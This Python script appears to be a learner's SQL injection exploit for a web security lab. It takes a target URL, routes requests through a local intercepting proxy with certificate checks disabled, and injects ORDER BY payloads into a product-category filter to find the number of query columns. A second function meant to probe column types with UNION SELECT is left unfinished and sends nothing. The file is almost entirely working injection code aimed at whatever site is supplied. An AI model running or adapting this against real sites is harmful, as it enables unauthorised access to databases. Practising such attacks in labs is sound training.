import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}

def datatype_exploit(url, col_num):
    path="filter?category=Gifts"
    for i in range(1,col_num):  
        payload=f"' UNION SELECT "

def col_num_exploit(url):
    path= "filter?category=Gifts"
    for i in range(1,20):
        payload= f"' ORDER BY {i}--"
        r = requests.get(url + path + payload, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            return i-1
        i=i+1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f" [ - ]  Usage: {sys.argv[0]} <URL>")
        sys.exit(-1)
        
    col_num=col_num_exploit(url)
    if col_num:
        print(f"The column number is: {col_num}")
        find_datatype=datatype_exploit(url, col_num)
    else:
        print("Unsuccessful")